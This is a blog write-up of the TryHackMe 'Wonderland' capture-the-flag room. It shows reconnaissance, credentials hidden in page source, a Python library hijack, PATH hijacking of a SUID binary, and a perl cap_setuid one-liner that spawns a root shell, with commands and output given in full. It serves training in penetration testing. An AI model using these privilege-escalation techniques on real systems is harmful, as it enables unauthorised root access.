---
layout: post
title: "Wonderland Writeup"
author: "Mouse"
categories: tryhackme
tags: [writeup]
image: thm_wonderland.jpg
permalink: /tryhackme/wonderland-writeup
---
<div align="center"><b>“Fall down the rabbit hole and enter wonderland”</b></div>

### Introduction

This is a writeup of the Alice In Wonderland-themed TryHackMe capture the flag challenge, [Wonderland](https://tryhackme.com/room/wonderland). This challenge has been rated medium difficulty. There are two flags to find - we know that there is a flag in a file called ```user.txt```, and a root flag in ```root.txt```.

### Initial Reconnaissance
 We start with an nmap scan, to see which ports are open and what services are running. We scan for service versions, operating systems, and utilise common scripts.

##### Command:
> sudo nmap -sC -sV -A -O [target]

We get the following output:

```
Nmap scan report for [target]
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http	Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT  	ADDRESS
1   22.17 ms 10.9.0.1
2   21.93 ms 10.10.245.213

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.28 seconds
```

SSH on port ```22``` is open. We also see a webserver running on port ```80```. The following webpage is presented when this webserver is visited:

![alt text](/assets/img/tryhackme/wonderland/homepage.PNG "Web Page")

### Webpage Enumeration

It appears we are told to ‘follow the white rabbit’, of which there is an image. We are also presented with a quote from Alice in Wonderland. At first I considered the possibility of a hidden message steganographically embedded into this image. However, it is wiser to investigate some more conventional avenues before resorting to steganography. Upon inspection of the source code, not much is revealed. However, we note that the image comes from a directory called ```/img```.

{% highlight html %}
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Follow the White Rabbit.</h1>
    <p>"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)</p>
    <img src="/img/white_rabbit_1.jpg" style="height: 50rem;">
</body>
{% endhighlight %}

We will investigate this directory, but before we do that, we first use ```gobuster``` to try to enumerate any more hidden subdirectories. The SecLists ```Web-Content/common.txt``` wordlist is used.

##### Command:
> gobuster dir -u [target] -w seclists/Discovery/Web-Content/common.txt

We find the following directories:

```
===============================================================
2022/12/14 23:18:23 Starting gobuster in directory enumeration mode
===============================================================
/img              	(Status: 301) [Size: 0] [--> img/]
/index.html       	(Status: 301) [Size: 0] [--> ./]  
/r                	(Status: 301) [Size: 0] [--> r/]  
/render/https://www.google.com (Status: 301) [Size: 0] [--> /render/https:/www.google.com]
```

Upon inspection of the ```/img``` subdirectory, we find two more images, namely ```alice_door.jpg``` and ```alice_door.png```.
These images, appear very similar, however the ```png``` version appears to have a yellow tint (on the right). Curiouser and curiouser…

![alt text](/assets/img/tryhackme/wonderland/alice.PNG "alice_door images")

Next, gobuster is run again but with a larger wordlist. This time, the SecLists medium directory list, ```directory-list-2.3-medium.txt``` is used. This revealed a subdirectory, ```/poem```. This leads us to a page with a poem about the Jabberwocky.

![alt text](/assets/img/tryhackme/wonderland/jaberwocky.PNG "Jabberwocky Poem")

This is most likely a red herring. Next, gobuster was run again, but starting at the URL [target]/r. This revealed another directory ```/r/a```, containing another cryptic message telling us to ‘keep going’.

![alt text](/assets/img/tryhackme/wonderland/keepgoing.PNG "Keep Going")

A pattern can be spotted. We attempt to visit the url ```[target]/r/a/b/b/i/t```, which appears fruitful.

![alt text](/assets/img/tryhackme/wonderland/rabbit.PNG "/r/a/b/b/i/t")

We have even found the yellow version of the ```alice_door.png``` file. The source code reveals a hidden paragraph, ```alice:HowDothTheLittleCrocodileImproveHisShiningTail```. Perhaps an SSH key, or some other credential set?

{% highlight html %}
<!DOCTYPE html>
<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
{% endhighlight %}

The title of this page is ‘Open the door and enter wonderland’ - perhaps this is telling us to SSH in…

### Initial SSH Access

We SSH into alice’s user with the given credentials. This is successful.

##### Command:
>ssh alice@[target]

```
┌──(kali㉿kali)-[~]
└─$ ssh alice@[target]                                                         
alice@[target]'s password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management: 	https://landscape.canonical.com
 * Support:    	https://ubuntu.com/advantage

  System information as of Thu Dec 15 04:47:17 UTC 2022

  System load:  0.01           	Processes:       	84
  Usage of /:   18.9% of 19.56GB   Users logged in: 	0
  Memory usage: 35%            	IP address for eth0: 10.10.245.213
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$
```

We snoop around ```alice```’s home directory. We find out that this is an Ubuntu machine using the command ```uname -a```. We find two interesting files - ```root.txt``` and ```walrus_and_the_carpenter.py``` - a python script. We have found the root flag, but naturally ```alice``` doesn't have correct permissions to open it. There is no sign of the other flag. When we examine the python script, we find this:

{% highlight python %}
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

( ... )

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
	line = random.choice(poem.split("\n"))
	print("The line was:\t", line)

{% endhighlight %}

This python script stores a poem, and spits out 10 random lines. We now look at the permissions of this python script.

##### Command:
>ls -l

```
alice@wonderland:~$ ls -l
total 8
-rw------- 1 root root   66 May 25  2020 root.txt
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
```

The Python script runs as root! We now check what the ```alice``` user can do with ```sudo```.

##### Command:
>sudo -l

```
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
	env_reset, mail_badpass,
	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
	(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Alice can run python, and the poem script, as the ```rabbit``` user! However, the current user ```alice``` does not have permissions to write to the file. Nevertheless, we can still exploit this misconfiguration.

### Python Library Hijacking

Notice that the python script imports the ```random``` module. We locate this file, then check its permissions.

##### Commands:
> locate random.py
>ls -l [location[/random.py]

```
alice@wonderland:~$ locate random.py
/usr/lib/python3.6/random.py

alice@wonderland:~$ ls -l /usr/lib/python3.6/random.py
-rw-r--r-- 1 root root 27442 Apr 18  2020 /usr/lib/python3.6/random.py
```
My first thought was to edit the ```random.py``` file, but we do not have write permissions. However, there is another avenue for exploitation. When python imports modules, it has a ‘priority’ list of locations it searches for the requested module. We can find the list of locations that python will fetch modules from.

##### Command:
> python3.6 -c ‘import sys; print(sys.path)’

```
alice@wonderland:~$ python3.6 -c 'import sys; print(sys.path)'
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```

We notice something strange. The first place python searches for requested modules is a blank space - this means python will search the user’s current directory before searching any of the predefined directories. Our course of action is therefore to write a Python file called ```random.py```, and store it in the directory ```/home/alice```. In this file, we will launch a shell. Due to the python file running as the ```rabbit``` user, this shell will launch as ```rabbit```! Because Python will check the current directory before the true location of ```random.py```, ```/usr/lib/python3.6```, our malicious ```random.py``` will run instead. This type of attack is known as a [Python Library Hijack](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8).

##### Command:
> nano random.py

In the malicious ```random.py``` file, we insert the following code:
{% highlight python %}
import os
os.system("/bin/sh")
{% endhighlight %}

The current directory now looks like this:
```
alice@wonderland:~$ ls
random.py  root.txt  walrus_and_the_carpenter.py
```

We now run the file ```walrus_and_the_carpenter.py``` as the ```rabbit``` user.

##### Command:
> sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
$ whoami
rabbit
```

This attack worked! The python file used our malicious ```random.py``` module, and started a ```rabbit``` shell. We now use the python ```pty``` module to gain a more stable shell.

##### Command:
> python3.6 -c 'import pty; pty.spawn("/bin/bash")'

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
$ whoami
rabbit
$ python3.6 -c 'import pty; pty.spawn("/bin/bash")'               
rabbit@wonderland:~$
```

### PATH Hijacking

We now have a snoop around ```rabbit```’s home directory.

```
rabbit@wonderland:~$ pwd
/home/alice
rabbit@wonderland:~$ cd ../rabbit
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root	4096 May 25  2020 ..
lrwxrwxrwx 1 root   root   	9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
```

We find a file called ```teaParty```, which as SUID permissions enabled. Let’s investigate this with the ```file``` command.

##### Command:
> file teaParty

```
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```

It appears that ```teaParty``` is an ELF executable file.

Before, running this executable, I wanted to investigate any strings remaining in the compiled binary. Unfortunately, the ```strings``` program, which extracts strings out of compiled binaries, is not installed.

##### Command:
> strings teaParty

```
rabbit@wonderland:/home/rabbit$ strings teaParty
Command 'strings' not found, but can be installed with:
apt install binutils
Please ask your administrator.
```

We run the executable.

```
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 16 Dec 2022 03:20:31 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

It appears we have to wait an hour from the current time (yes, I am doing this CTF at 02:20…). Some further investigation is required. Netcat is used to transfer this executable onto my local machine.

##### Command on local machine:
> nc -lnvp 54321 > teaParty

##### Command on SSH machine:
> nc [local ip] 54321 < teaParty

The file is now on my local machine. As before, ```strings``` is used to find strings in the compiled executable.

##### Command:
> strings teaParty

```
─$ strings teaParty
130 ⨯
/lib64/ld-linux-x86-64.so.2
(...)
_u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
(...)
```

We see the command used to get the system time - the ```date``` command. Using a similar technique to the Python Library Hijack attack, we create a new file called ```date```, containing a shell script. Usually, ```date``` is stored in ```/bin/date```. We will put our malicious ```date``` executable in the directory above ```/bin```, so it executes instead of the true ```date```. To accomplish this, we will put the malicious ```date``` in the ```/tmp``` directory, before adding ```/tmp``` to the ```PATH``` variable.

##### Commands:
> cd /tmp
nano date
chmod +x date

We have also ensured that the new ```date``` file can be executed. The new ```date``` file now contains the following:

```
#!/bin/bash

/bin/bash
```

We now edit the ```PATH``` variable.

##### Command:
> export PATH=/tmp:$PATH

The ```PATH``` variable will now start with ```/tmp```. This means that ```/tmp``` will be the first place the kernel searches when fetching binaries to execute. Since our malicious ```date``` file is located in ```/tmp```, this will be executed instead of the correct ```date```, located in ```/bin```.  Once this is done, ```teaParty``` is executed.

```
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ whoami
hatter
hatter@wonderland:/home/rabbit$
```

This has worked! We are now the ```hatter``` user.

### Capabilities on Perl

We will now investigate ```hatter```’s home directory.

```
hatter@wonderland:/home/rabbit$ cd ../hatter
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```

It appears that we have found a password. When we use the command ```su hatter``` and enter this password, it is accepted. We can therefore conclude that this is the password of the ```hatter``` user. I tried to find out what ```hatter``` can run with ```sudo```, but the output was ```Sorry, user hatter may not run sudo on wonderland.```.

To escalate our privileges further, we search for [capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities). Capabilities break up root privileges into smaller chunks, so that smaller subsets of processes can be accessed. This ensures users only get the privileges they truly need, and the risk of exploitation is reduced. But this risk is never zero…

For more on exploiting capabilities for privilege escalation, [this article](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) gives an in-depth guide.

We search for capabilities available to the ```hatter``` user.

##### Command:
> getcap -r / 2>/dev/null

```
hatter@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

It appears that the ```hatter``` user has the capability ```cap_setuid``` on Perl. From the Linux Manual page:
>##### CAP_SETUID
    * Make arbitrary manipulations of process UIDs ;
    * forge UID when passing socket credentials via UNIX domain sockets;
    * write a user ID mapping in a user namespace;

From [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities), we can manipulate the UID of the perl binary itself gain privileged access.

##### Command:
>perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/
# whoami
root
# python3.6 -c 'import pty; pty.spawn("/bin/bash")'
root@wonderland:~#
```

And now we are root! Again, the command ```python3.6 -c 'import pty; pty.spawn("/bin/bash")' ``` is used to gain a more stable shell. We can now read the root flag ```/home/alice/root.txt```. We also find the ```user.txt``` flag hidden in the root directory. Pretty mischievous that the ‘easier’ flag still required root access!

```
root@wonderland:/home/alice# cat root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
root@wonderland:/home/alice# cd /root
root@wonderland:/root# ls
user.txt
root@wonderland:/root# cat user.txt
thm{"Curiouser and curiouser!"}
```
We now have both flags, and the challenge is complete.

### Conclusion

Throughout this CTF challenge, many penetration testing techniques were explored, especially around lateral movement and pivoting through a system. We started with some iniital reconnaissance, when we found a web server running. We enumerated subdirectories on this web server, and eventually found the first SSH credentials, allowing us initial access to the system. We then used numerous mathods for lateral movement and privilege escelation, including Python Library Hijacking, using malicious binaries and editing the PATH variable, and exploiting misconfigured capabilities. Through these techniques, we were able to find both the root flag and user flag.

This room has highlighted the vulnerabilities exposed by simple misconfiguration. None of these pivoting methods would have worked if it weren't for the evident misconfigurations in this system. Program imports should be limited, and users should not be able to change library files. Moreover, the error in the Python library-searching hierachy should have not been present. Additionally, users should not be allowed to edit the PATH variable, and executables should not directly induce binaries using unquoted service paths - this is the vulnerability that allowed us to use a malicious ```date``` binary. We have also seen that capabilities, whilst useful, must be used resposibly.

### Tools Used
 * nmap
 * gobuster


### External Links
